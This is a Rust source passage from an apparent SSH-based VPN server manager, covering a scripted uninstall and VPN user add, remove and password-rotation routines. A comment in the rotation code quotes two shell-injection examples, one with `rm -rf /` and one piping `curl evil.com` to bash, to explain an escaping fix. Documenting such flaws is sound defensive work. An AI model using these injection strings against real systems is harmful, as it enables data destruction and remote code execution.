    // removed — the LEGACY (no-snapshot) ownership proof for the ufw/fail2ban package purge
    // and the BBR revert. Written ONLY by our install/enable actions, so an admin's
    // pre-existing component never carries one.
    ufw_pkg_ours: bool,
    fail2ban_pkg_ours: bool,
    bbr_prior_marker: Option<&str>,
    selection: &UninstallSelection,
    snapshot: Option<&super::snapshot::PreInstallSnapshot>,
) -> String {
    // OWNERSHIP-SCOPED extended cleanup (LE state + ufw-by-comment + iptables-by-tag)
    // — see build_uninstall_extras doc. host already whitelist-validated upstream.
    // ssh_port = the port THIS session is riding (SshParams.port); made SACRED so the
    // firewall/fail2ban teardown can never close the admin out (post-UAT brick fix).
    let uninstall_extras = build_uninstall_extras(sudo, host, ssh_port);
    // Step 0: stop an in-progress deploy (kill OUR recorded process group + heal
    // dpkg) so a mid-install cancel leaves a clean, re-runnable server — never
    // touches the system's own apt (05-UAT 2026-06-09).
    let stop_in_progress = build_stop_in_progress(sudo);

    // ── D-07 package-purge gate (build-time half; the in-shell `$TT_INSTALLED_*` marker
    //    is the other half — kept as a belt-and-suspenders double gate). A purge is emitted
    //    when the selection checkbox is set AND ownership is proven.
    //    18-10: ownership = the `.tt-installed-{ufw,fail2ban}` INSTALL-MARKER
    //    (`ufw_pkg_ours`/`fail2ban_pkg_ours`) OR the snapshot proving the package was absent
    //    pre-install. The install-marker is written ONLY when the package was ABSENT at our
    //    install (server_security.rs) → strictly STRONGER proof than the snapshot, and it
    //    exists on LEGACY servers with no snapshot. This SUPERSEDES M-01's snapshot-only
    //    gate: a legacy server whose ufw/fail2ban WE apt-installed now correctly purges the
    //    package. With NEITHER marker nor snapshot-absent (an admin's pre-existing package)
    //    the conservative branch keeps it. The marker being authoritative means a snapshot
    //    that (wrongly) recorded the package present cannot veto a genuine marker. ──
    let ufw_purge = selection.ufw
        && (ufw_pkg_ours || snapshot.map(|s| !s.ufw_present).unwrap_or(false));
    let fail2ban_purge = selection.fail2ban
        && (fail2ban_pkg_ours || snapshot.map(|s| !s.fail2ban_present).unwrap_or(false));
    // WR-1/WR-2: pass the SELECTION bit separately from the purge decision so an unchecked
    // (keep-as-is) component is never disabled/stripped, only a checked-but-unowned one reverts.
    let fail2ban_deprovision = build_fail2ban_deprovision(sudo, selection.fail2ban, fail2ban_purge);
    let ufw_deprovision = build_ufw_deprovision(sudo, selection.ufw, ufw_purge);

    // ── Step 4 dir removal. Users are PART OF the protocol → «удалить протокол» ALWAYS removes
    //    the whole {dir}, accounts included. 18-UAT: the optional «keep users» preserve path was
    //    REMOVED (owner decision). A preserved credential list left the reinstalled endpoint unable
    //    to export the user's config («There is no user config for specified username», code 101 —
    //    the endpoint's per-user config could not be re-materialized from the surviving
    //    credentials.toml alone), and the owner does not want a keep-users option at all. So the
    //    teardown is unconditional: the whole install dir goes, and success = {dir} is gone. ──
    let remove_dir = format!("{sudo}rm -rfv {dir}");
    let verify_block =
        format!("if test -d {dir}; then\n    echo \"UNINSTALL_FAILED\"\nelse\n    echo \"UNINSTALL_OK\"\nfi");

    // ── MTProto fold (D-05 ownership gate). ONLY when selection.mtproto AND the snapshot
    //    POSITIVELY proves telemt was absent pre-install. build_telemt_teardown's surgical
    //    lines carry no inner `sudo` (designed to run inside a `{sudo}bash <<'UUID'` heredoc,
    //    like mtproto_uninstall), so we wrap the fragment in exactly that. The UUID delim
    //    (D-INV-3) is generated here; the fragment content is fully static (no user input),
    //    so this only affects the delimiter token, never the tested content. ──
    // 18-UAT (owner principle / WR-8): remove ONLY what WE installed, proven by OUR
    // `.tt-installed-mtproto` marker (mtproto_is_ours) — NEVER inferred from the snapshot's
    // "telemt was absent before us". First-touch absence does NOT prove the CURRENTLY-installed
    // telemt is ours: an admin could have installed their own telemt AFTER our protocol install,
    // and the snapshot-absent inference would then destroy it. Since 18-09 EVERY app MTProto
    // install writes the marker, so a normal install stays fully removable; the snapshot is no
    // longer an authorization to destroy (it remains only the non-destructive D-05 pre-allow).
    let telemt_step = if selection.mtproto && mtproto_is_ours {
        // H-04: pass the SACRED ssh_port so the fold's ufw delete never enumerates the
        // SSH allow (anchored port match + SSH-port exclusion inside build_telemt_teardown).
        let teardown = super::server_mtproto::build_telemt_teardown(sudo, telemt_port, ssh_port);
        let delim = format!("TELEMT_TEARDOWN_EOF_{}", uuid::Uuid::new_v4().simple());
        format!(
            "echo \"=== Step 5g: Remove MTProto (telemt) — ownership-gated (D-05) ===\"\n\
{sudo}bash <<'{delim}'\n{teardown}{delim}\n"
        )
    } else {
        String::new()
    };

    // ── BBR fold (D-02b / T-18-15 system-global ownership gate). M-02: revert ONLY on
    //    POSITIVE proof — the restore algo must be a KNOWN non-BBR algorithm. An inconclusive
    //    `""`/`"unknown"` (a FAILED probe) or `bbr` is NOT proof → no revert.
    //    18-UAT (owner principle / WR-8): the revert authorization AND the algo to restore both
    //    come from OUR `.tt-bbr-prior` marker (`bbr_prior_marker`) — NOT the snapshot. "BBR was
    //    off before us" (first-touch) does not prove WE enabled the CURRENT BBR (an admin could
    //    have enabled it after us), so the snapshot is no longer an authorization to revert. Every
    //    app BBR-enable writes the marker (18-10), so normal use is unaffected; the marker passes
    //    through the `bbr_revert_target` whitelist so it can never revert to `bbr`/unknown, and we
    //    restore the RECORDED prior algo (not a hardcoded `cubic`). build_bbr_revert carries
    //    per-command sudo → drops straight into this script and also drops the spent marker. ──
    let restore_algo = bbr_prior_marker.and_then(super::server_bbr::bbr_revert_target);
    let bbr_step = match restore_algo {
        Some(restore_algo) if selection.bbr => {
            let revert = super::server_bbr::build_bbr_revert(sudo, restore_algo);
            format!("echo \"=== Step 5h: Revert BBR to '{restore_algo}' (our .tt-bbr-prior marker proves we enabled it) ===\"\n{revert}\n")
        }
        _ => String::new(),
    };
    format!(
        r#"set -x
echo "=== BEFORE: listing {dir} ==="
ls -la {dir}/ 2>&1 || echo "(dir does not exist)"

{stop_in_progress}
echo "=== Step 0.6: Read TrustTunnel provisioning markers (BEFORE {dir} removal) ==="
# Captured NOW because Step 4 below removes {dir}. These gate the smart de-provision
# in Step 5e: purge ufw/fail2ban ONLY if WE installed them (marker present), disable
# ufw only if WE enabled it. Servers provisioned before these markers existed have
# none → packages are kept (their ufw rules + our fail2ban jail are still cleaned).
TT_INSTALLED_UFW=0; TT_ENABLED_UFW=0; TT_INSTALLED_F2B=0
[ -f {dir}/.tt-installed-ufw ] && TT_INSTALLED_UFW=1
[ -f {dir}/.tt-enabled-ufw ] && TT_ENABLED_UFW=1
[ -f {dir}/.tt-installed-fail2ban ] && TT_INSTALLED_F2B=1
echo "markers: ufw_installed=$TT_INSTALLED_UFW ufw_enabled=$TT_ENABLED_UFW f2b_installed=$TT_INSTALLED_F2B"
# Capture the admin's own client IP (as the server sees THIS session) so the scoped
# fail2ban unban in Step 5e can lift a self-ban of exactly this address. sshd sets
# SSH_CONNECTION for exec channels; first field = client IP (v4 or v6). Empty is fine.
TT_SSH_IP=$(echo "${{SSH_CONNECTION:-}}" | awk '{{print $1}}')

echo "=== Step 1: Stop systemd service ==="
{sudo}systemctl stop trusttunnel 2>/dev/null || true
{sudo}systemctl disable trusttunnel 2>/dev/null || true

echo "=== Step 2: Kill processes ==="
{sudo}killall -9 {svc} 2>/dev/null || true
{sudo}killall -9 setup_wizard 2>/dev/null || true
sleep 1

echo "=== Step 3: Remove systemd units ==="
{sudo}rm -f /etc/systemd/system/trusttunnel.service
{sudo}rm -f /etc/systemd/system/trusttunnel*.service
# C-15: remove the systemd DROP-IN DIRECTORY created by deploy.rs (`mkdir -p
# /etc/systemd/system/trusttunnel.service.d` for the zero-downtime ExecReload).
# `rm -f` above can NOT remove a directory and the `*.service` glob never matches
# the `.d` dir, so the drop-in survived a clean uninstall. Use `rm -rf` and run it
# BEFORE daemon-reload so the reload re-reads units without our drop-in. The path is
# 100%-ours → ownership-safe (never a foreign file).
{sudo}rm -rf /etc/systemd/system/trusttunnel.service.d 2>/dev/null || true
# CAMOUFLAGE REMOVED: the former "Step 3b" that stopped/disabled/removed the
# trusttunnel-decoy.service unit was dropped with the camouflage feature — the installer
# no longer provisions a decoy, so there is nothing to remove here.
{sudo}systemctl daemon-reload

echo "=== Step 4: Remove {dir} (whole install dir — users go with the protocol) ==="
{remove_dir}
# CORE-REMOVAL SENTINEL (post-UAT «код -1» fix): the firewall/Fail2ban teardown that runs
# BELOW can reset OUR OWN established SSH connection (conntrack flush / brief DROP on
# `ufw --force disable`/`apt purge ufw`/fail2ban stop), closing THIS channel before the final
# VERIFY sentinel + the command exit status ever reach the app — even though the protocol
# (systemd service + {dir}) is already gone. Emit an authoritative core-removed marker HERE,
# BEFORE any firewall op, so `uninstall_server` can confirm success from the (partial) output
# even when the channel dies mid-teardown. The dir was just `rm -rfv`'d above.
if test -d {dir}; then echo "CORE_REMOVE_FAILED"; else echo "CORE_REMOVED_OK"; fi

echo "=== Step 5: Remove certbot cron ==="
{sudo}rm -f /etc/cron.d/trusttunnel-cert-renew 2>/dev/null || true

{uninstall_extras}
# CR-2 (Phase-18 re-review): the MTProto (Step 5g) + BBR (Step 5h) folds run HERE — BEFORE
# the Step 5e fail2ban/ufw teardown — not after it. That teardown (`ufw --force disable` /
# `apt purge` / fail2ban stop) can reset OUR OWN established SSH channel (the «код -1» case);
# with the folds sitting after it, a mid-teardown drop left telemt STILL SERVING with a valid
# secret and BBR STILL ON while the app reported success (CORE_REMOVED_OK already emitted at
# Step 4). These folds are channel-safe — telemt's ufw cleanup is delete-by-number with the
# SSH port excluded (H-04) and BBR is a plain sysctl write — so running them before any
# connection-resetting op guarantees they actually complete. The FINAL SACRED-SSH re-assert
# still stays last (after Step 5e), so the SSH allow is the last firewall word either way.
{bbr_step}{telemt_step}echo "=== Step 5e: Smart de-provision of TrustTunnel-managed security (ownership-scoped) ==="
# fail2ban: always remove OUR jail config; purge the package only if WE installed it.
# SACRED SSH (post-UAT brick fix): a fail2ban ban is an iptables/nft DROP that can
# OUTLIVE `apt purge` (purge removes config/db, not live kernel rules) and the ban DB
# (/var/lib/fail2ban) restores bans on the next boot. So we (a) UNBAN before stopping
# the daemon (only a live daemon can unban), (b) drop the ban DB, and (c) sweep any
# orphaned f2b chains in Step 5f — so a self-ban can never strand SSH after uninstall.
# D-07: the `apt-get purge` inside is emitted (build-time) only when selection.fail2ban
# AND the snapshot does not prove fail2ban pre-existed; otherwise the conservative branch
# keeps the admin's package (below).
{fail2ban_deprovision}
echo "=== Step 5f: Sweep orphaned fail2ban DROP chains (backend-agnostic, dead-daemon safe) ==="
# unban only works against a LIVE daemon; a wedged/killed fail2ban (or a re-run after a
# prior purge) can leave an f2b DROP chain with no daemon to lift it. Sweep those — but
# ONLY when fail2ban is NOT active, so a LIVE admin fail2ban's chains are never touched.
if ! {sudo}systemctl is-active --quiet fail2ban 2>/dev/null; then
  if command -v iptables >/dev/null 2>&1; then
    for tt_ch in $({sudo}iptables -S 2>/dev/null | grep -oE 'f2b-[A-Za-z0-9_.-]+' | sort -u); do
      # Flush FIRST — an emptied chain implicitly RETURNs, so the ban is neutralized even
      # if the jump-rule delete below fails (Fable LOW-5). Then remove the jump rule by
      # replaying its EXACT spec from `-S INPUT` (a bare `-D INPUT -j f2b-x` never matches
      # fail2ban's `--dports … -j f2b-x` multiport jump), then drop the freed chain.
      {sudo}iptables -F "$tt_ch" 2>/dev/null || true
      {sudo}iptables -S INPUT 2>/dev/null | grep -- "-j $tt_ch" | sed 's/^-A/-D/' | while read -r tt_rule; do {sudo}iptables $tt_rule 2>/dev/null || true; done
      {sudo}iptables -X "$tt_ch" 2>/dev/null || true
    done
  fi
  if command -v nft >/dev/null 2>&1; then
    # `[[:space:]]f2b-` matches fail2ban's own `f2b-…` table name token only — never an
    # admin table that merely contains "f2b" mid-name (Fable LOW-6).
    {sudo}nft list tables 2>/dev/null | grep -E '[[:space:]]f2b-' | while read -r _tt_kw tt_fam tt_tname; do
      [ -n "$tt_fam" ] && [ -n "$tt_tname" ] && {sudo}nft delete table "$tt_fam" "$tt_tname" 2>/dev/null || true
    done
  fi
fi
# ufw: the TrustTunnel rules were removed above (Step 5c). Now the package / state.
# `ufw --force disable` first drops all enforcement (default ACCEPT) so purging can
# never strand the SSH session — there is no lock-out window. D-07: the `apt-get purge`
# inside is emitted (build-time) only when selection.ufw AND the snapshot does not prove
# ufw pre-existed; otherwise the conservative branch keeps the admin's package.
{ufw_deprovision}
# SACRED SSH (post-UAT brick fix): FINAL unconditional re-assert of the active SSH
# port's allow — the last word on firewall state. If ufw was purged above,
# `command -v ufw` is now false → skipped (enforcement gone, port already open). If ufw
# is kept (admin's firewall stays on), this GUARANTEES port {ssh_port} is allowed before
# the script returns — regardless of markers, the sweep, or any race. Only when ufw is
# ACTIVE (the only state with lockout risk): an inactive/absent ufw is already open, and
# we avoid writing a rule into an admin's inactive ruleset (Fable LOW-4). `-w` word-match
# so «inactive» never false-matches «active». Idempotent.
if command -v ufw >/dev/null 2>&1 && {sudo}ufw status 2>/dev/null | head -1 | grep -qiw active; then
  {sudo}ufw allow {ssh_port}/tcp comment 'SSH keep active session' >/dev/null 2>&1 || true
fi
echo "=== Step 6: Remove binaries from PATH ==="
{sudo}rm -fv /usr/local/bin/trusttunnel* 2>/dev/null || true
{sudo}rm -fv /usr/bin/trusttunnel* 2>/dev/null || true
# C-16: remove the cert-renewal helper written by deploy.rs to /usr/local/sbin
# (`/usr/local/sbin/trusttunnel-cert-renew.sh`). Step 6 previously swept only
# /usr/local/bin + /usr/bin, never /usr/local/sbin, so the helper was orphaned. The
# `trusttunnel*` prefix scopes the glob to OUR files only (no foreign sbin script).
{sudo}rm -fv /usr/local/sbin/trusttunnel* 2>/dev/null || true

echo "=== Step 7: Search for any remaining trusttunnel files ==="
find / -maxdepth 4 -name '*trusttunnel*' -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null || true

# C-20: admin-shared apt PACKAGES (certbot/curl/iptables) are deliberately NOT
# purged here — removing a package an admin may rely on is an over-deletion
# violation. We remove only the host's Let's Encrypt cert STATE (in the extras
# above) plus OUR own files; that shared tooling stays installed for the admin.
# EXCEPTION (post-UAT, Step 5e above): ufw + fail2ban ARE smart-purged — but ONLY
# when an ownership marker proves WE apt-installed them (the package was absent).
# An admin's pre-existing ufw/fail2ban is never purged; only our rules + jail go.

echo "=== VERIFY ==="
{verify_block}
"#
    )
}

/// Completely remove TrustTunnel from the server.
/// NOTE: Uses direct connect (NOT pooled) — destructive one-shot operation.
///
/// PHASE 18 (UN-1) — component-selective, snapshot-evidence-gated FULL REVERT. `selection`
/// is the per-component UN-1 payload; `None` (pre-18-05 callers / the wizard cancel-rollback
/// path that omit it) defaults to `UninstallSelection::restore_all` = today's full revert
/// (D-03). Before building the script this:
///   1. reads the pre-install snapshot (`read_preinstall_snapshot`) → `Option<..>` evidence
///      (`None` = legacy server → D-06 conservative marker-only path),
///   2. resolves the telemt port with an EXPLICIT telemt.toml SSH read (mirrors
///      `mtproto_uninstall`): the port drives the fold's ufw delete-by-number, the `_secret`
///      is bound to `_` and NEVER logged (D-29), and a missing telemt.toml defaults the port
///      to 0 (the fold's ufw block is then a no-op).
///
/// The Tauri command surface (frontend payload wiring) is plan 18-05; until then the macro
/// passes `Option<UninstallSelection>` and the omitted case defaults to restore_all here.
pub async fn uninstall_server(
    app: &tauri::AppHandle,
    params: SshParams,
    selection: Option<UninstallSelection>,
) -> Result<(), String> {
    // D-03: an omitted selection (pre-18-05 callers, wizard cancel-rollback) restores to
    // exactly pre-install — remove everything WE installed (today's full-revert behavior).
    let selection = selection.unwrap_or_default();
    // 06-uat (Layer 1 of the cancel→reinstall race fix): when this runs as the CANCEL
    // rollback, wait (bounded) for the in-flight deploy_server to finish aborting BEFORE
    // we connect and run the destructive `rm -rf /opt/trusttunnel`, so the removal can
    // never race a still-running configure stage. The frontend fires `cancel_deploy`
    // first, so the run aborts within ~250 ms; a normal uninstall (no deploy running)
    // returns from this immediately.
    crate::ssh::deploy::await_deploy_idle(4000).await;

    emit_step(app, "uninstall", "progress", "Connecting to server...");

    let handle = params.connect_with_app(app.clone()).await
        .inspect_err(|e| { emit_step(app, "uninstall", "error", e); })?;

    // Determine sudo
    let sudo = detect_sudo(&handle, app).await;

    emit_step(app, "uninstall", "progress", "Removing TrustTunnel...");

    // UN-2 evidence: read the pre-install snapshot BEFORE building the script. `None` =
    // legacy server (installed before this feature) → the D-06 conservative marker-only
    // path (no snapshot-gated purge / no MTProto or BBR fold). The snapshot carries no
    // secret by construction (see PreInstallSnapshot), so this read cannot leak (D-29).
    let snapshot = super::snapshot::read_preinstall_snapshot(app, &handle, sudo)
        .await
        .unwrap_or(None);

    // Resolve the telemt/MTProto proxy port via a PORT-ONLY telemt.toml read.
    // C-01: previously this `cat`-ed the whole telemt.toml and fed it to
    // parse_telemt_toml_minimal — but exec_command echoes every stdout line into the
    // log channel, so the `[access.users] trusttunnel = "<hex>"` secret line leaked on
    // EVERY protocol uninstall. `build_telemt_port_read` greps ONLY the port integer,
    // so the secret never leaves the server. The port drives the fold's ufw
    // delete-by-number; a missing telemt.toml → port 0 → the fold's ufw block is a
    // no-op. The MTProto fold itself is ownership-gated inside build_uninstall_script
    // (WR-8: only when OUR `.tt-installed-mtproto` marker is present — the snapshot no
    // longer authorizes), so reading the port here is harmless when the fold does not fire.
    let telemt_port = {
        let (port_out, _) = exec_command(
            &handle,
            app,
            &super::server_mtproto::build_telemt_port_read(sudo),
        )
        .await?;
        super::server_mtproto::parse_telemt_port_line(&port_out)
    };

    // 18-09 / WR-8: read the MTProto ownership MARKER (`/opt/trusttunnel/.tt-installed-mtproto`).
    // POSITIVE proof that OUR install created this telemt proxy — after WR-8 this marker is the
    // SOLE authorization for the fold (the snapshot no longer authorizes destruction). Bare
    // `test -f` → no content read, so the secret never leaves the server (D-29). An admin's own
    // pre-existing telemt never carries the marker → never folded (D-05).
    let mtproto_is_ours = {
        let (marker_out, _) = exec_command(
            &handle,
            app,
            &super::server_mtproto::build_mtproto_marker_probe(sudo),
        )
        .await?;
        marker_out.contains("MARKER_PRESENT")
    };

    // 18-10: read the ufw/fail2ban INSTALL-markers (`/opt/trusttunnel/.tt-installed-*`) so
    // the package purge can fire on a LEGACY server with no snapshot. Written ONLY when WE
    // apt-installed the package (it was absent), so a marker is authoritative ownership
    // proof. Bare `test -f` → no content read (D-29). An admin's pre-existing package never
    // carries the marker → never purged.
    let (ufw_pkg_ours, fail2ban_pkg_ours) = {
        let (out, _) = exec_command(&handle, app, &build_pkg_marker_probe(sudo)).await?;
        parse_pkg_marker_probe(&out)
    };

    // 18-10: read the `.tt-bbr-prior` marker CONTENT (the algo active before our first
    // `enable_bbr`). On a LEGACY server (no snapshot) this is the only proof that WE enabled
    // BBR and what to restore. `bbr_revert_target` whitelists the token before it reaches any
    // `sysctl -w` (build_uninstall_script), so an admin's `bbr`/an unknown prior is never
    // reverted. Non-secret token → nothing leaks (D-29).
    let bbr_prior_marker = {
        let (out, _) = exec_command(&handle, app, &super::server_bbr::build_bbr_prior_read(sudo)).await?;
        super::server_bbr::parse_bbr_prior_marker(&out)
    };

    // Run full uninstall as a single script for reliability. The script body is built
    // by the pure, unit-testable `build_uninstall_script` (06-16 C-18: pinned to the
    // deploy.rs COCOON MANIFEST by a symmetry test). host is validated upstream by
    // `validate_ssh_host` (no shell metacharacters).
    let uninstall_script = build_uninstall_script(
        sudo,
        ENDPOINT_DIR,
        ENDPOINT_SERVICE,
        &params.host,
        params.port,
        telemt_port,
        mtproto_is_ours,
        ufw_pkg_ours,
        fail2ban_pkg_ours,
        bbr_prior_marker.as_deref(),
        &selection,
        snapshot.as_ref(),
    );

    let (output, code) = exec_command(&handle, app, &uninstall_script).await?;

    // Success = the protocol footprint (systemd service + {dir}) is confirmed gone. The
    // firewall/Fail2ban teardown that runs AFTER the core removal can reset OUR OWN established
    // SSH connection (conntrack flush on `ufw --force disable`/`apt purge ufw`/fail2ban stop),
    // closing this channel before the final exit status — `exec_command` then returns code == -1
    // (its default; no ExitStatus was received). A dropped channel is NOT a failure once the
    // CORE_REMOVED_OK sentinel (emitted right after `rm -rfv {dir}`, before any firewall op)
    // confirms the dir is gone; the interrupted firewall cleanup is best-effort and the SACRED
    // SSH port stays open regardless. Only an explicit FAILED marker, or NO success sentinel with
    // a genuine non-zero exit (not the -1 drop after a confirmed core removal), is a real failure.
    let core_removed = output.contains("CORE_REMOVED_OK");
    let hard_fail = output.contains("UNINSTALL_FAILED") || output.contains("CORE_REMOVE_FAILED");
    if hard_fail || (!core_removed && code != 0) {
        let msg = format!("SSH_UNINSTALL_FAILED|{code}");
        emit_step(app, "uninstall", "error", &msg);
        handle.disconnect(russh::Disconnect::ByApplication, "", "en").await.ok();
        return Err(msg);
    }
    if core_removed && code != 0 {
        // Core removal confirmed but the channel dropped mid-teardown — log it (no secret) so a
        // «код -1»-that-actually-succeeded is debuggable, and proceed as success.
        emit_log(app, "warn", "uninstall: SSH channel dropped during firewall/Fail2ban teardown after the protocol was already removed — treating as success (core footprint confirmed gone)");
    }

    emit_log(app, "info", "TrustTunnel completely removed from server");

    handle.disconnect(russh::Disconnect::ByApplication, "", "en").await.ok();

    emit_step(app, "uninstall", "ok", "TrustTunnel removed");
    Ok(())
}

/// SSH to the server, append a new [[client]] entry to credentials.toml,
/// restart the service, export the client config, and save it locally.
///
/// Thin wrapper over `add_server_user_internal` that restarts the service
/// (standalone add path: frontend calls us directly). Callers that plan to
/// write additional config files (e.g. rules.toml) and want to coalesce
/// restarts should call `add_server_user_internal` with `skip_restart=true`.
pub async fn add_server_user(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    vpn_username: String,
    vpn_password: String,
) -> Result<String, String> {
    add_server_user_internal(app, handle, vpn_username, vpn_password, false).await
}

/// Internal add-user implementation. See `add_server_user` for the public
/// wrapper used by the Tauri command surface.
///
/// WR-04 (14.1-REVIEW deep pass): `skip_restart=true` suppresses the
/// systemctl restart at the end of this function so that callers which
/// perform additional config writes (e.g. rules.toml in
/// `server_add_user_advanced`) can coalesce into a single restart — every
/// restart briefly disconnects ALL active VPN sessions on the server, so
/// doing it twice for one logical admin action is twice the blast radius.
/// The caller is responsible for running `systemctl restart trusttunnel`
/// once all writes are done; otherwise the new credentials stay dormant.
async fn add_server_user_internal(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    vpn_username: String,
    vpn_password: String,
    skip_restart: bool,
) -> Result<String, String> {
    emit_step(app, "connect", "ok", "Connected to server");
    emit_step(app, "auth", "ok", "Authentication successful");

    let sudo = detect_sudo(handle, app).await;

    // Check that credentials.toml exists
    emit_step(app, "check", "progress", "Checking configuration...");

    let (cfg_check, _) = exec_command(
        handle, app,
        &format!("test -f {dir}/credentials.toml && echo CFG_OK || echo CFG_MISSING", dir = ENDPOINT_DIR)
    ).await?;

    if !cfg_check.contains("CFG_OK") {
        // 06-14 C-07: translatable code → translateSshError → sshErrors.credentialsNotFound.
        let msg = "SSH_CREDENTIALS_NOT_FOUND";
        emit_step(app, "check", "error", msg);
        return Err(msg.into());
    }

    // Check if username already exists
    let (creds_raw, _) = exec_command(
        handle, app,
        &format!("{sudo}grep -oP 'username\\s*=\\s*\"\\K[^\"]+' {dir}/credentials.toml 2>/dev/null || echo ''", dir = ENDPOINT_DIR)
    ).await?;
    let existing_users: Vec<&str> = creds_raw.lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty())
        .collect();

    if existing_users.contains(&vpn_username.as_str()) {
        // 06-14 C-07: translatable code carrying ONLY the username (already
        // validate_vpn_username-clean, non-secret) — NEVER the password (D-29). The
        // frontend (translateSshError → sshErrors.userAlreadyExists) splits on '|' and
        // interpolates the name into the friendly RU sentence.
        let msg = format!("SSH_USER_ALREADY_EXISTS|{}", vpn_username);
        emit_step(app, "check", "error", &msg);
        return Err(msg);
    }

    emit_step(app, "check", "ok", "Configuration verified");

    // Validate user inputs before constructing shell commands
    validate_vpn_username(&vpn_username)?;
    validate_vpn_password(&vpn_password)?;

    // Append new [[client]] block to credentials.toml using heredoc (safe from injection)
    emit_step(app, "configure", "progress", &format!("Adding user '{}'...", vpn_username));

    // CR-03: validator now rejects \\, ', " in passwords. Username already passed
    // validate_vpn_username (no shell metachars). The .replace below stays as a
    // belt-and-braces no-op for usernames in case future validator relaxations
    // re-allow backslash.
    let escaped_user = vpn_username.replace('\\', "\\\\");
    let escaped_pass = vpn_password.replace('\\', "\\\\");
    // WR-04: randomize the heredoc delimiter so a hypothetical password / username
    // equal to the literal sentinel cannot terminate the heredoc early. UUID v4
    // collision probability is negligible.
    let delim = format!("USER_EOF_{}", uuid::Uuid::new_v4().simple());
    let append_cmd = format!(
        r#"{sudo}tee -a {dir}/credentials.toml > /dev/null << '{delim}'

[[client]]
username = "{escaped_user}"
password = "{escaped_pass}"
{delim}"#,
        dir = ENDPOINT_DIR
    );

    let (_, append_code) = exec_command(handle, app, &append_cmd).await?;

    if append_code != 0 {
        let msg = "SSH_ADD_USER_FAILED";
        emit_step(app, "configure", "error", msg);
        return Err(msg.into());
    }

    emit_step(app, "configure", "ok", "User added");

    // WR-04: coalesce restarts when the caller plans further config writes.
    // The caller MUST run systemctl restart trusttunnel once done, otherwise
    // the new credentials stay dormant.
    if !skip_restart {
        // Restart service to pick up new credentials
        emit_step(app, "service", "progress", "Restarting service...");

        let (_, restart_code) = exec_command(
            handle, app,
            &format!("{sudo}systemctl --no-block restart trusttunnel 2>&1")
        ).await?;

        if restart_code != 0 {
            emit_log(app, "warn", "Failed to restart service. Manual restart may be needed.");
        }

        // Wait for service to start
        tokio::time::sleep(std::time::Duration::from_secs(2)).await;

        emit_step(app, "service", "ok", "Service restarted");
    }

    // User added — config download is done separately via UI
    emit_step(app, "done", "ok", &format!("User '{}' added!", vpn_username));

    Ok(vpn_username)
}

/// Remove a VPN user from credentials.toml on the remote server and restart the service.
pub async fn server_remove_user(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    vpn_username: String,
) -> Result<(), String> {
    // Validate before interpolating into shell command
    validate_vpn_username(&vpn_username)?;

    let sudo = detect_sudo(handle, app).await;

    // Use sed to remove the [[client]] block matching the username.
    let escaped_user = vpn_username.replace('\'', "'\\''");
    let dir = ENDPOINT_DIR;
    let remove_cmd = format!(
        r#"{sudo}python3 -c "
import re, sys
with open('{dir}/credentials.toml', 'r') as f:
    content = f.read()
# Split into blocks by [[client]]
blocks = re.split(r'(?=\[\[client\]\])', content)
filtered = [b for b in blocks if not re.search(r'username\s*=\s*\"{}\"', b)]
with open('{dir}/credentials.toml', 'w') as f:
    f.write(''.join(filtered).strip() + '\n')
" 2>/dev/null || {sudo}sed -i '/\[\[client\]\]/,/^$/{{/username\s*=\s*\"{escaped_user}\"/{{:a;N;/\n\s*$/!ba;d}}}}' {dir}/credentials.toml"#,
        escaped_user
    );

    let (_, remove_code) = exec_command(handle, app, &remove_cmd).await?;

    if remove_code != 0 {
        return Err("SSH_DELETE_USER_FAILED".into());
    }

    // Restart service to apply changes
    let (_, restart_code) = exec_command(
        handle, app,
        &format!("{sudo}systemctl --no-block restart trusttunnel 2>&1"),
    ).await?;

    if restart_code != 0 {
        return Err("User removed, but failed to restart service".into());
    }

    // FIX-NN: best-effort cleanup of users-advanced.toml. credentials.toml
    // is already updated above — a write failure here only leaves a dangling
    // entry in our sidecar, which is harmless (next Edit with the same name
    // just overwrites it). Do NOT propagate errors — user-facing action
    // already succeeded.
    let _ = super::users_advanced::delete_user_advanced(app, handle, vpn_username).await;

    Ok(())
}

/// Atomically rotate a user's password. Uses a single SSH python3 invocation that reads
/// credentials.toml, regex-replaces the password line for the matching username, and writes
/// atomically via tmp+rename. If the username is not found, returns error WITHOUT modifying
/// the file (T-14.1-05 atomicity guarantee).
///
/// Security: password value NEVER emitted via `emit_log` or any event (T-14.1-02).
/// Partial-failure shape (Q3): returns JSON-structured error `{kind, was_rolled_back, exit_code}`
/// when the write stage fails. The atomic tmp+rename guarantees the file is either fully
/// replaced or untouched — if exit code != 0 and != 9, original file is preserved.
pub async fn server_rotate_user_password(
    app: &tauri::AppHandle,
    handle: &client::Handle<SshHandler>,
    vpn_username: String,
    new_password: String,
) -> Result<(), String> {
    validate_vpn_username(&vpn_username)?;
    validate_vpn_password(&new_password)?;

    let sudo = detect_sudo(handle, app).await;
    let dir = ENDPOINT_DIR;

    // CR-03 mitigation: previous version put the python script inside double-quoted bash
    // (`python3 -c "..."`), which leaves $, `, \, " unescaped and lets a password like
    // `evil"; rm -rf /; #` or `$(curl evil.com|bash)` break out into shell. Now we use
    // a single-quoted heredoc — bash performs NO substitutions inside it, and the only
    // way to terminate is a literal `PY_ROTATE_EOF` line by itself.
    //
    // validate_vpn_password additionally rejects `'` and `\` (shell-unsafe in this context),
    // so we don't need to escape inside the python string literal anymore. Other chars
    // like `"`, `$`, `` ` `` are safe inside single-quoted heredoc.
    // WR-04: randomized delimiter so the heredoc cannot be terminated early by a
    // password / username equal to the literal sentinel.
    let delim = format!("PY_ROTATE_EOF_{}", uuid::Uuid::new_v4().simple());
    let rotate_cmd = format!(
        r#"{sudo}python3 << '{delim}'
import re, os, tempfile
path = '{dir}/credentials.toml'
with open(path, 'r') as f:
    content = f.read()
pattern = r'(\[\[client\]\]\s*\nusername\s*=\s*"{user}"\s*\npassword\s*=\s*")[^"]*(")'
new_content, n = re.subn(pattern, lambda m: m.group(1) + '{pass}' + m.group(2), content)
if n == 0:
    raise SystemExit(9)
fd, tmp = tempfile.mkstemp(dir=os.path.dirname(path))
with os.fdopen(fd, 'w') as f:
    f.write(new_content)
os.replace(tmp, path)
{delim}"#,
        sudo = sudo,
        dir = dir,
        user = vpn_username,
        pass = new_password,
    );

